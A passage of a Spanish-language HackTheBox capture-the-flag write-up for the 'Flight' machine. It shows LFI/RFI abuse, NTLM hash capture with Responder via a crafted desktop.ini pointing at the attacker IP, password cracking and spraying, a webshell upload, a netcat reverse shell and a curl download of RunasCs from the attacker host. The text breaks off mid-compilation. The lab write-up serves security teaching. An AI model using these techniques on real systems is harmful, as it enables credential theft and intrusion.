---
title: Flight Writeup - HackTheBox
date: 2023-04-17
categories: [Writeups, HTB]
tags: [Windows, HTB, CTF, Hard, SMB, Password Cracking, RPF, Desktop.ini]
img_path: /assets/img/commons/flight/
image: flight.png
---

¡Hola!

En este writeup vamos a explorar la máquina [**Flight**](https://app.hackthebox.com/machines/510) de HackTheBox, considerada de dificultad difícil en la plataforma. En esta máquina, realizaremos enumeración web y SMB capturando algunos hashes NTLv2, para el acceso al servidor, explotaremos un archivo desktop.ini para capturar un hash de un usario con permisos de escrita en un recurso compartido que nos permite cargar una webshell, realizaremos un remote portforwarding de un servicio local al cual cargaremos una nueva webshell y finalmente escalaremos privilegios abusando del privilegio SeImpersonatePrivilege.

¡Empecemos!

## Reconocimiento activo

---

Como primer paso, lanzamos el comando `ping` desde nuestro equipo atacante para verificar si la máquina objetivo está activa.

```bash
❯ ping -c 1 10.10.11.187
PING 10.10.11.187 (10.10.11.187) 56(84) bytes of data.
64 bytes from 10.10.11.187: icmp_seq=1 ttl=127 time=107 ms

--- 10.10.11.187 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 107.247/107.247/107.247/0.000 ms
```

Dado que el `TTL` es cercano a 128, podemos inferir que la máquina objetivo probablemente sea Windows.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -n -sS -Pn --min-rate 5000 10.10.11.187 -oG allPorts.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 22:32 -05
Nmap scan report for 10.10.11.187
Host is up (0.11s latency).
Not shown: 65516 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49694/tcp open  unknown
49723/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, activamos los scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49694,49723 -sV -sC --min-rate 5000 10.10.11.187 -oN services.txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 22:34 -05
Nmap scan report for 10.10.11.187
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: g0 Aviation
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-18 10:34:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49723/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 6h59m57s
| smb2-time: 
|   date: 2023-04-18T10:35:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.74 seconds
```

Se identifican algunos puertos comunes en entornos de Active Directory, tales como el `53/TCP` para **DNS**, el `88/TCP` para **Kerberos**, el `389/TCP` y `636/TCP` para **LDAP** y **LDAPS**, respectivamente.

### HTTP - 80

Si exploramos el servicio web, encontraremos la siguiente página web.

![web](web.png)

Inspeccionamos cada sección y el código fuente de la página web, sin embargo, no encontramos nada relevante. No obstante, al observar el pie de página, identificamos un dominio interesante.

![web2](web2.png)

Entonces, agregamos el dominio al archivo `/etc/hosts` para realizar una traducción de dominio adecuada.

```bash
❯ echo "10.10.11.187\tflight.htb" >> /etc/hosts
```

Al acceder al dominio, nos damos cuenta de que se trata de la misma página web analizada anteriormente. Además, el informe de Nmap indica que había un servicio web en el puerto 5985, pero al intentar acceder obtuvimos un código de estado 404.

### Fuzzing de dominios

El siguiente paso fue realizar un Fuzzing de directorios sobre los servicios web identificados. No obstante, no encontramos ningún recurso relevante que nos permitiera acceder al servidor.

Posteriormente, procedimos a realizar Fuzzing de subdominios con la herramienta `wfuzz`.

```bash
❯ wfuzz -c -t 200 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.flight.htb" --hh=7069 http://flight.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://flight.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                              
=====================================================================

000000624:   200        90 L     412 W      3996 Ch     "school"                                                                                                             

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0
```

Observamos que se ha identificado un subdominio, por lo que lo agregamos nuevamente al archivo `/etc/hosts`.

```bash
❯ tail -n 1 /etc/hosts
10.10.11.187	flight.htb	school.flight.htb
```

Al acceder al dominio, nos encontramos con la siguiente página web.

![domain](domain.png)

Notamos que en cada sección de la página web (Home, About Us y Blog), se utiliza una cadena de consulta que pasa un parámetro llamado `view` con el valor correspondiente al contenido de la página, por ejemplo, `home.html`.

Ante esta evidencia, intentamos probar si esta URL es vulnerable a LFI accediendo a un archivo local como `C:/WINDOWS/System32/drivers/etc/hosts`.

![lfi](lfi.png)

Como podemos ver, tuvimos éxito al acceder al archivo local, lo que indica que la vulnerabilidad está presente.

También intentamos comprobar si es vulnerable a RFI creando un servidor simple con Python y accediendo directamente a él a través de la URL.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Como podemos ver, tuvimos éxito al acceder al servidor creado con Python, lo que indica que la URL es vulnerable a RFI.

![rfi](rfi.png)

Por lo tanto, podemos explotar esta vulnerabilidad subiendo un payload malicioso en nuestro servidor que genere una reverse shell que nos permita acceder al servidor víctima a través de la URL vulnerable, sin embargo, el servidor víctima no lo interpreta correctamente.

Dado que esta máquina corría varios protocolos que se usan en entornos de Active Directory, intentamos acceder a un recurso externo que no existe para envenenar el tráfico e intentar capturar algún hash de un servicio o usuario.

```bash
http://school.flight.htb/index.php?view=//10.10.14.6/test
```

Al levantar el responder, logramos obtener el hash del servicio `svc_apache`.

```bash
❯ responder -I tun0 -dwv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.6]
    Responder IPv6             [dead:beef:2::1004]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-W1JLJ8BY8F7]
    Responder Domain Name      [1TMK.LOCAL]
    Responder DCE-RPC Port     [48259]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:bbf5a964d32e9ca4:53C32E4A937BEAC4B45C8C629B6F2CA3:0101000000000000804B6EFA8D71D901D45E58BDB75CAEE70000000002000800310054004D004B0001001E00570049004E002D00570031004A004C004A0038004200590038004600370004003400570049004E002D00570031004A004C004A003800420059003800460037002E00310054004D004B002E004C004F00430041004C0003001400310054004D004B002E004C004F00430041004C0005001400310054004D004B002E004C004F00430041004C0007000800804B6EFA8D71D9010600040002000000080030003000000000000000000000000030000010A8C6F32D36B3D02D33BF9622D90A962B5A1D0D099674FF68DA2DE3C6E2EB370A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```

Procedemos a crackear el hash con la herramienta **John the Ripper**.

```bash
❯ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)     
1g 0:00:00:04 DONE (2023-04-18 00:43) 0.2283g/s 2434Kp/s 2434Kc/s 2434KC/s SADSAM..S42150461
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

### SMB

Una vez con las credenciales, podemos enumerar el servicio SMB. Empezamos por enumerar los recursos compartidos.

```bash
❯ crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ            
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ
```

Podemos observar que solo contamos con permisos de lectura. En el recurso `Users` encontramos algunas carpetas pertenecientes a usuarios del sistema, incluyendo el archivo `desktop.ini`, el cual almacena información sobre la configuración de las carpetas del Explorador de archivos en Windows.

```bash
❯ smbclient //10.10.11.187/Users -U svc_apache
Password for [WORKGROUP\svc_apache]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Thu Sep 22 15:16:56 2022
  ..                                 DR        0  Thu Sep 22 15:16:56 2022
  .NET v4.5                           D        0  Thu Sep 22 14:28:03 2022
  .NET v4.5 Classic                   D        0  Thu Sep 22 14:28:02 2022
  Administrator                       D        0  Mon Oct 31 13:34:00 2022
  All Users                       DHSrn        0  Sat Sep 15 02:28:48 2018
  C.Bum                               D        0  Thu Sep 22 15:08:23 2022
  Default                           DHR        0  Tue Jul 20 14:20:24 2021
  Default User                    DHSrn        0  Sat Sep 15 02:28:48 2018
  desktop.ini                       AHS      174  Sat Sep 15 02:16:48 2018
  Public                             DR        0  Tue Jul 20 14:23:25 2021
  svc_apache                          D        0  Fri Oct 21 13:50:21 2022

		5056511 blocks of size 4096. 1254658 blocks available
smb: \>
```

Por otro lado, en el recurso `Web` encontramos los recursos asociados a las páginas de los dominios `flight.htb` y `school.flight.htb`.

```bash
❯ smbclient //10.10.11.187/Web -U svc_apache
Password for [WORKGROUP\svc_apache]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 18 21:27:00 2023
  ..                                  D        0  Tue Apr 18 21:27:00 2023
  flight.htb                          D        0  Tue Apr 18 21:27:00 2023
  school.flight.htb                   D        0  Tue Apr 18 21:27:00 2023

		5056511 blocks of size 4096. 1254228 blocks available
smb: \>
```

También podemos realizar una enumeración de los usuarios del sistema.

```bash
❯ crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)
SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 0 desc: Helpdesk
SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: Service Apache web
SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 0 desc: Secretary
SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 0 desc: Project Manager
SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 0 desc: Nobody knows why he's here
SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 0 desc: Payroll officer
SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: Senior Web Developer
SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 0 desc: Sysadmin
SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 0 desc: Penetration tester
SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 0 desc: Sales manager
SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 0 desc: HR Assistant
SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: Junion Web Developer
SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: Built-in account for guest access to the computer/domain
SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
```

Copiamos este resultado y creamos un diccionario de usuarios para comprobar si alguno de ellos usa la misma contraseña que el servicio `svc_apache`.

```bash
❯ cat users | awk '{print $5}'
flight.htb\O.Possum
flight.htb\svc_apache
flight.htb\V.Stevens
flight.htb\D.Truff
flight.htb\I.Francis
flight.htb\W.Walker
flight.htb\C.Bum
flight.htb\M.Gold
flight.htb\L.Kein
flight.htb\G.Lors
flight.htb\R.Cold
flight.htb\S.Moon
flight.htb\krbtgt
flight.htb\Guest
flight.htb\Administrator
❯ cat users.txt | awk '{print $5}' > users.txt
```

Podemos confirmar que el usuario `S.Moon` también utiliza la misma contraseña que el servicio `svc_apache`.

```bash
❯ crackmapexec smb 10.10.11.187 -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE
```

Realizamos nuevamente una enumeración de los recursos compartidos pero como usuario `S.Moon` para ver si tenemos permisos adicionales.

```bash
❯ crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ
```

Podemos observar que en el recurso `Shared` tenemos permisos de lectura y escritura. Sin embargo, al acceder a dicho recurso, podemos comprobar que se encuentra vacío y no contiene ningún archivo o carpeta.

```bash
❯ smbclient //10.10.11.187/Shared -U S.Moon
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Apr 18 21:53:43 2023
  ..                                  D        0  Tue Apr 18 21:53:43 2023

		5056511 blocks of size 4096. 1255062 blocks available
smb: \>
```

## Explotación

---

### Abuso del archivo desktop.ini

Recordamos que en el recurso `Users` encontramos el archivo `desktop.ini`, lo que podría ser una indicación de que la explotación puede ocurrir mediante el abuso de dicho archivo.

Los siguientes enlaces explican cómo funciona el archivo `desktop.ini` y cómo puede ser explotado:

- [https://isc.sans.edu/diary/Desktopini+as+a+postexploitation+tool/25912](https://isc.sans.edu/diary/Desktopini+as+a+postexploitation+tool/25912)
- [https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini)

En resumen, es posible aprovechar el archivo `desktop.ini` para resolver una ruta de red y, una vez que un usuario acceda a la carpeta, obtener los hashes de sus credenciales de acceso.

Así que creamos un archivo `desktop.ini` con una ruta de red, como se muestra a continuación:

```bash
[.ShellClassInfo]
IconResource=\\10.10.14.6\test
```

Posteriormente, lo cargamos en el recurso compartido `Shared`.

```bash
❯ smbclient //10.10.11.187/Shared -U S.Moon
Password for [WORKGROUP\S.Moon]:
Try "help" to get a list of possible commands.
smb: \> put desktop.ini 
putting file desktop.ini as \desktop.ini (0,1 kb/s) (average 0,1 kb/s)
smb: \> dir
  .                                   D        0  Tue Apr 18 22:11:39 2023
  ..                                  D        0  Tue Apr 18 22:11:39 2023
  desktop.ini                         A       49  Tue Apr 18 22:11:39 2023

		5056511 blocks of size 4096. 1254126 blocks available
```

Luego, levantamos nuevamente el responder y esperamos la captura de algún hash.

```bash
❯ responder -I tun0 -dwv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.6]
    Responder IPv6             [dead:beef:2::1004]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-JTT2RZUEZI4]
    Responder Domain Name      [ZL5B.LOCAL]
    Responder DCE-RPC Port     [45307]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.187
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:9610781b47c9d972:B734D8D3A5B47A4D30A768015F90F979:0101000000000000002733230872D9017F7889FFBD38628100000000020008005A004C003500420001001E00570049004E002D004A0054005400320052005A00550045005A004900340004003400570049004E002D004A0054005400320052005A00550045005A00490034002E005A004C00350042002E004C004F00430041004C00030014005A004C00350042002E004C004F00430041004C00050014005A004C00350042002E004C004F00430041004C0007000800002733230872D901060004000200000008003000300000000000000000000000003000001252D3C3642B0C60C4ED0BB4903C1A4F872362DBF1CCEF26617335C4F85F8E1A0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0036000000000000000000
```

Luego de una espera, obtenemos el hash del usuario `c.bum`. Por lo tanto, procedemos a crackear el hash con **John the Ripper**:

```bash
❯ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:04 DONE (2023-04-18 15:21) 0.2257g/s 2378Kp/s 2378Kc/s 2378KC/s TinyMutt69..Tiffani29
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

A continuación, volvemos a enumerar los recursos compartidos para verificar si se tienen permisos adicionales sobre otro recurso.

```bash
❯ crackmapexec smb 10.10.11.187 -u c.bum -p 'Tikkycoll_431012284' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\c.bum:Tikkycoll_431012284 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ,WRITE
```

Podemos observar que el usuario `c.bum` tiene permisos de lectura y escritura sobre el recurso `Web`. Si recordamos, este recurso es donde se almacenan los recursos web de los dominios.

Por lo tanto, podemos cargar una webshell en dicho recurso compartido. En este caso, utilizamos la webshell: [wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

```bash
❯ smbclient //10.10.11.187/Web -U c.bum
Password for [WORKGROUP\c.bum]:
Try "help" to get a list of possible commands.
smb: \> cd school.flight.htb\
smb: \school.flight.htb\> put webshell.php 
putting file webshell.php as \school.flight.htb\webshell.php (21,1 kb/s) (average 21,1 kb/s)
smb: \school.flight.htb\> dir
  .                                   D        0  Tue Apr 18 22:34:35 2023
  ..                                  D        0  Tue Apr 18 22:34:35 2023
  about.html                          A     1689  Mon Oct 24 22:54:45 2022
  blog.html                           A     3618  Mon Oct 24 22:53:59 2022
  home.html                           A     2683  Mon Oct 24 22:56:58 2022
  images                              D        0  Tue Apr 18 22:32:00 2023
  index.php                           A     2092  Thu Oct 27 02:59:25 2022
  lfi.html                            A      179  Thu Oct 27 02:55:16 2022
  styles                              D        0  Tue Apr 18 22:32:00 2023
  webshell.php                        A     7205  Tue Apr 18 22:34:35 2023

		5056511 blocks of size 4096. 1252493 blocks available
```

Una vez cargada la web shell, lo que podemos hacer es subir el ejecutable `nc.exe` para establecer una reverse shell. 

Creamos una carpeta en la raíz para almacenar el ejecutable.

![nc](nc.png)

Nos ubicamos en el directorio `/usr/share/windows-resources/binaries/nc.exe` en nuestro sistema Kali y generamos un servidor HTTP simple con Python para compartir el ejecutable.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la webshell, lo descargamos con el siguiente comando:

![download_nc](download_nc.png)

Una vez que tenemos el ejecutable en la máquina víctima, podemos establecer una reverse shell con el siguiente comando:

![reverse_shell](reverse_shell.png)

Para obtener la conexión, debemos establecer el listener en el puerto correspondiente.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.187] 50089
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\nc>whoami
whoami
flight\svc_apache
```

Como vemos, obtenemos acceso como usuario `svc_apache`. Sin embargo, ya tenemos las credenciales del usuario `c.bum`, por lo que podemos usar la utilidad [RunasCs](https://github.com/antonioCoco/RunasCs) para ejecutar procesos específicos con diferentes permisos que los que proporciona el inicio de sesión actual del usuario, utilizando credenciales explícitas.

Así que compartimos la utilidad creando un servidor HTTP con Python.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

La descargamos en la máquina víctima.

```bash
C:\Users\svc_apache\Desktop>curl http://10.10.14.6/RunasCs.cs -o RunasCs.cs
curl http://10.10.14.6/RunasCs.cs -o RunasCs.cs
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 80738  100 80738    0     0   153k      0 --:--:-- --:--:-- --:--:--  153k
```

Y posteriormente la compilamos con el siguiente comando:

```bash
C:\Users\svc_apache\Desktop>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
Microsoft (R) Visual C# Compiler version 4.7.3190.0
for C# 5
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

RunasCs.cs(277,29): warning CS0612: 'RunasCs.inet_addr(string)' is obsolete
